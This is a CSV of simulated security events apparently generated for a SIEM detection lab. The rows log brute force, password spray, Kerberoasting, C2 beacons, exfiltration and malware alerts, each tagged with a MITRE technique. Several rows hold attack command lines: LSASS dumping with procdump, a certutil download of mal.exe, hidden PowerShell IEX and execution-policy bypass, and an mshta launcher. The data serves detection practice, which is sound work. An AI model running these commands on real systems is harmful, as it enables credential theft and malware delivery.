access_type,action,action_taken,agent_ip,agent_name,attachment,attacker_host,attempt_count,bytes_sent,bytes_transferred,cloud_provider,command,command_line,destination_domain,destination_host,destination_ip,destination_port,dns_query,encryption_type,event_code,event_type,failure_reason,file_hash,file_path,files_affected,host,image,indicator,injection_type,lab_attack,lab_note,log_source,login_location_1,login_location_2,logon_type,malware_name,mitre_technique,parent_process,ports_scanned,privileges_assigned,process,process_id,protocol,query_count,query_type,recipient,registry_key,resource,rule_name,scan_type,sender,service_name,severity,signature,signature_id,signed,source_host,source_ip,source_process,subject,target_ip,target_process,time_difference_minutes,timestamp,tool,user,value,wazuh_rule_desc,wazuh_rule_id
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T09:28:37.663061,,temp.analyst,,,
,,,,,,,,,,,,procdump.exe -ma lsass.exe lsass.dmp,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,mimikatz.exe,4688,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T06:45:37.663313,,praharsh.admin,,,
,,,,,,,178,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T22:36:37.661751,Hydra / CrackMapExec,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T03:38:37.663153,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,DEV-SERVER-01,,,,True,,Windows Security,,,,,T1068,,,SeRestorePrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-19T22:51:37.665319,,john.doe,,,
,,,,,,,167,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T16:04:37.662255,Hydra / CrackMapExec,dev.engineer,,,
,,,,,,,,6027535,,,,,evil-c2[.]com,,194.165.16.11,8443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T11:38:37.666421,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.102,,,,,,2026-04-21T18:24:37.660501,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.backup,High,,,,,,,,,,,2026-04-21T05:32:37.662784,,praharsh.admin,,,
,CreateAccessKey,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,ec2:sg-12345,,,,,High,,,,,,,,,,,2026-04-22T03:58:37.667944,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\ProgramData\malware.bat,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,msiexec.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-23T23:43:37.663930,,john.doe,,,
,,,,,,,,,,,powershell.exe -ep bypass -file C:\shell.ps1,,,,,,,,4104,PowerShell Execution,,,,,FIN-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T00:29:37.664770,,attacker,,,
,,,,,,,187,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T16:57:37.662637,Hydra,admin,,,
,,,,,,,296,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T07:13:37.661737,Hydra / CrackMapExec,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.101,,,,,,2026-04-24T14:24:37.660394,,finance.user,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,FIN-SERVER-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.15,,,,,,2026-04-24T05:15:37.660690,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,WIN-DC-PRAHARSH,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.102,,,,,,2026-04-23T18:51:37.659786,,finance.user,,,
,,,,,,KALI-LAB-01,449,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T23:10:37.661466,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,172.16.0.100,,,,,,2026-04-20T20:27:37.659656,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T06:17:37.663036,,john.doe,,,
,,,,,,,,,,,,,,,192.168.56.104,4444,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,wmic.exe,,,,,,,,,,,,High,,,,,192.168.56.105,,,,,,2026-04-20T05:28:37.663472,,john.doe,,,
,,,,,,,,,,,,"mshta vbscript:Execute(""CreateObject(""Wscript.Shell"").Run"")",,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,regsvr32.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T06:42:37.664838,,attacker,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,33534,,,,,,,,,,,TCP Connect,,,Medium,,,,,192.168.56.104,,,192.168.56.101,,,2026-04-24T00:39:37.665109,Nmap,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WAZUH-MANAGER-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,172.16.0.100,,,,,,2026-04-21T10:10:37.661251,,lab.administrator,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.101,1433,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-RDP,,,,Low,,,,,185.220.101.45,,,,,,2026-04-20T12:54:37.668507,,,,,
,,,,,,,,,,,powershell -nop -w hidden -c IEX,,,,,,,,4104,PowerShell Execution,,,,,KALI-LAB-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T23:43:37.664498,,jane.smith,,,
,,,,,,,,,,,,,,FIN-SERVER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,WAZUH-MANAGER-01,10.0.2.10,,,,,,2026-04-24T09:14:37.665413,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,FIN-SERVER-01,,,APC Injection,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,wmic.exe,,,lsass.exe,,2026-04-19T20:52:37.667534,,,,,
,,,,,,,216,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T04:17:37.662237,Hydra / CrackMapExec,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,SPLUNK-VM-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,194.165.16.11,,,,,,2026-04-22T08:29:37.660137,,jane.smith,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.101,4444,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-RDP,,,,Low,,,,,103.45.78.21,,,,,,2026-04-24T01:00:37.668351,,,,,
,,,,,,,,7123114,,,,,data-exfil[.]io,,194.165.16.11,8443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-20T08:43:37.666476,,,,,
,,,,,,,,,,,,certutil -urlcache -split -f http://192.168.56.104/mal.exe C:\Windows\Temp\mal.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,regsvr32.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T15:39:37.664922,,attacker,,,
,,,,,,,,,,,,,,,45.67.22.10,9001,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,cscript.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-24T06:19:37.663567,,john.doe,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.101,445,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-RDP,,,,Low,,,,,91.234.56.78,,,,,,2026-04-24T11:31:37.668172,,,,,
,,,,,,KALI-LAB-01,226,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T11:04:37.661553,Hydra,lab.administrator,,,
,,,,,,KALI-LAB-01,56,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T18:53:37.661432,Hydra,lab.administrator,,,
,,,,,,,,,,Okta,,,,,,,,,,Impossible Travel,,,,,,,,,,,Azure AD / Okta,India,Russia,,,T1078.004,,,,,,,,,,,,,,,,High,,,,,,,,,,18,2026-04-22T23:44:37.668139,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-PRAHARSH-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.105,,,,,,2026-04-23T06:48:37.661188,,attacker,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,FIN-SERVER-01,,,APC Injection,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,wscript.exe,,,svchost.exe,,2026-04-23T14:15:37.667585,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,KALI-LAB-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.10,,,,,,2026-04-23T14:51:37.661232,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,77.73.133.84,,,,,,2026-04-20T05:28:37.660269,,jane.smith,,,
,,,,,,,,,483934239,,,,,,103.45.78.21,,,,,Data Exfiltration Suspected,,,,,WIN-PRAHARSH-01,,,,,,Firewall,,,,,T1048,,,,,,SFTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T13:34:37.666786,,john.doe,,,
,,,,,,,306,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T17:40:37.662415,Hydra,root,,,
,AttachAdminPolicy,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,iam:user/temp.analyst,,,,,High,,,,,,,,,,,2026-04-24T08:59:37.667936,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,KALI-LAB-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,172.16.0.100,,,,,,2026-04-22T02:24:37.661029,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,WIN-PRAHARSH-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-24T01:47:37.660363,,temp.analyst,,,
,,,,,,,,7270028,,,,,cobalt-beacon[.]onion,,77.73.133.84,9001,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T11:28:37.666057,,,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.backup,High,,,,,,,,,,,2026-04-20T08:30:37.662780,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,FIN-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.102,,,,,,2026-04-22T15:40:37.660419,,dev.engineer,,,
,,,,,,,,,,,,,,FIN-SERVER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,DEV-SERVER-01,192.168.56.103,,,,,,2026-04-21T04:54:37.665477,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.backup,High,,,,,,,,,,,2026-04-23T07:32:37.662808,,jane.smith,,,
,,Cleaned,,,,,,,,,,,,,,,,,,Malware Detected,,deadbeef12345678cafebabe87654321,C:\Users\praharsh.admin\Downloads\invoice.exe,,FIN-SERVER-01,,,,,,Windows Defender / Wazuh,,,,Emotet,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T19:01:37.667379,,,,,
,,,,,,,,,,,,,,,185.220.101.45,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Critical,ET MALWARE CobaltStrike Beacon,2407933,,,192.168.56.101,,,,,,2026-04-23T23:30:37.668943,,,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,43194,KALI-LAB-01,,Mass file encryption detected,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-19T18:00:37.667728,,,,,
,AssumeRole,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,ec2:sg-12345,,,,,High,,,,,,,,,,,2026-04-24T12:29:37.667873,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,KALI-LAB-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.103,,,,,,2026-04-22T00:14:37.661106,,dev.engineer,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,SPLUNK-VM-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,194.165.16.11,,,,,,2026-04-22T07:34:37.660194,,finance.user,,,
,,,,,,,,,,,,wmic /node:TARGET process call create cmd.exe,,WIN-DC-PRAHARSH,,,,,1,WMI Remote Execution,,,,,,,,,,,Sysmon,,,,,T1047,,,,wmiprvse.exe,,,,,,,,,,,,High,,,,WAZUH-MANAGER-01,,,,,,,2026-04-19T22:40:37.665992,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.splunk,High,,,,,,,,,,,2026-04-21T11:43:37.662756,,lab.administrator,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.105,4444,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-C2-Ports,,,,Low,,,,,77.73.133.84,,,,,,2026-04-21T09:33:37.668251,,,,,
,,,,,invoice.xlsm,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,lab.administrator@praharsh-lab.local,,,,,it-helpdesk@micr0soft[.]com,,High,,,,,,,ACTION REQUIRED: Verify your identity,,,,2026-04-20T07:50:37.669274,,,,,
,,,,,,,,,,,,"mshta vbscript:Execute(""CreateObject(""Wscript.Shell"").Run"")",,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,certutil.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T03:44:37.664927,,svc.backup,,,
,,,,,,,,,,,,,,,45.67.22.10,1337,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,powershell.exe,,,,,,,,,,,,High,,,,,192.168.56.105,,,,,,2026-04-19T16:32:37.663401,,svc.backup,,,
,,,,,,,,,,,,,,KALI-LAB-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,WAZUH-MANAGER-01,10.0.2.10,,,,,,2026-04-24T10:40:37.665499,,dev.engineer,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,SPLUNK-VM-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.102,,,,,,2026-04-20T12:23:37.661052,,john.doe,,,
,,,,,,,,,,,,,,,185.220.101.45,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,High,ET EXPLOIT CVE-2021-44228 Log4j,2506748,,,192.168.56.103,,,,,,2026-04-21T16:48:37.669006,,,,,
,,Quarantined,,,,,,,,,,,,,,,,,,Malware Detected,,a1b2c3d4e5f6789012345678abcdef01,C:\Users\praharsh.admin\Downloads\invoice.exe,,ELK-SERVER-01,,,,,,Windows Defender / Wazuh,,,,RedLineStealer,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T20:16:37.667312,,,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Windows\Temp\payload.exe,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,cmd.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-20T23:04:37.663939,,finance.user,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WAZUH-MANAGER-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.103,,,,,,2026-04-21T12:13:37.661122,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,SPLUNK-VM-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.10,,,,,,2026-04-22T23:24:37.661256,,svc.backup,,,
,,,,,,,,5072160,,,,,malware-drop[.]net,,185.220.101.45,1337,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T13:28:37.666205,,,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1068,,,SeRestorePrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-23T02:53:37.665282,,john.doe,,,
,,,,,,,,,,,,,,,,,aGVsbG8.data-exfil[.]io,,,DNS Tunneling Detected,,,,,FIN-SERVER-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,683,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-20T22:10:37.666540,,,,,
,,,,,,,,,,,powershell.exe -ep bypass -file C:\shell.ps1,,,,,,,,4104,PowerShell Execution,,,,,ELK-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-24T04:23:37.664730,,dev.engineer,,,
,,,,,,,,,,,,,,,194.165.16.11,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Medium,ET TROJAN Metasploit Meterpreter,2527101,,,10.0.2.15,,,,,,2026-04-20T03:33:37.668844,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,WAZUH-MANAGER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,23.129.64.100,,,,,,2026-04-19T16:39:37.659614,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,46399,,,,,,,,,,,OS Detection,,,Medium,,,,,192.168.56.104,,,192.168.56.101,,,2026-04-20T03:31:37.665032,Nmap,,,,
,,,,,,,,,,Azure AD,,,,,,,,,,Impossible Travel,,,,,,,,,,,Azure AD / Okta,Germany,Russia,,,T1078.004,,,,,,,,,,,,,,,,High,,,,,,,,,,29,2026-04-21T19:03:37.667988,,finance.user,,,
,CreateAccessKey,,,,,,,,,Azure,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,iam:user/temp.analyst,,,,,High,,,,,,,,,,,2026-04-20T11:35:37.667908,,temp.analyst,,,
,,,,,,,,,,,,,,WIN-DC-PRAHARSH,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,SPLUNK-VM-01,172.16.0.100,,,,,,2026-04-22T15:05:37.665429,,praharsh.admin,,,
,,Detected,,,,,,,,,,,,,,,,,,Malware Detected,,5f4dcc3b5aa765d61d8327deb882cf99,C:\Users\praharsh.admin\Downloads\invoice.exe,,ELK-SERVER-01,,,,,,Windows Defender / Wazuh,,,,Cobalt.Strike.Beacon,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T20:30:37.667424,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.101,,,,,,2026-04-22T16:31:37.660582,,temp.analyst,,,
,,,,,,KALI-LAB-01,171,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T18:24:37.661462,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,FIN-SERVER-01,,,,True,,Windows Security,,,,,T1068,,,SeTcbPrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-24T02:00:37.665379,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,23880,,,,,,,,,,,OS Detection,,,Medium,,,,,192.168.56.104,,,192.168.56.101,,,2026-04-21T03:47:37.665184,Nmap,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.102,,,,,,2026-04-20T05:35:37.661079,,svc.backup,,,
,,,,,,,,,,,,,,DEV-SERVER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,WIN-DC-PRAHARSH,192.168.56.103,,,,,,2026-04-24T14:32:37.665504,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,38534,,,,,,,,,,,Version Scan,,,Medium,,,,,192.168.56.104,,,192.168.56.105,,,2026-04-24T03:45:37.665150,Nmap,,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,a1b2c3d4e5f6789012345678abcdef01,C:\Users\praharsh.admin\Downloads\invoice.exe,,WIN-DC-PRAHARSH,,,,,,Windows Defender / Wazuh,,,,Ryuk.Ransomware,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T16:45:37.667399,,,,,
,,,,,,,,,345239283,,,,,,45.67.22.10,,,,,Data Exfiltration Suspected,,,,,KALI-LAB-01,,,,,,Firewall,,,,,T1048,,,,,,FTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T19:55:37.667009,,john.doe,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,FIN-SERVER-01,,,,True,,Windows Security,,,,,T1068,,,SeImpersonatePrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T22:20:37.665336,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.splunk,High,,,,,,,,,,,2026-04-23T05:41:37.662749,,svc.splunk,,,
,,Detected,,,,,,,,,,,,,,,,,,Malware Detected,,0123456789abcdef0123456789abcdef,C:\Users\praharsh.admin\Downloads\invoice.exe,,FIN-SERVER-01,,,,,,Windows Defender / Wazuh,,,,Trojan.GenericKD,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T14:23:37.667259,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,DEV-SERVER-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.103,,,,,,2026-04-19T22:31:37.661074,,lab.administrator,,,
,,,,,,,56,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T01:56:37.661835,Hydra / CrackMapExec,john.doe,,,
,,,,,,,221,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T17:30:37.662382,Hydra,splunk,,,
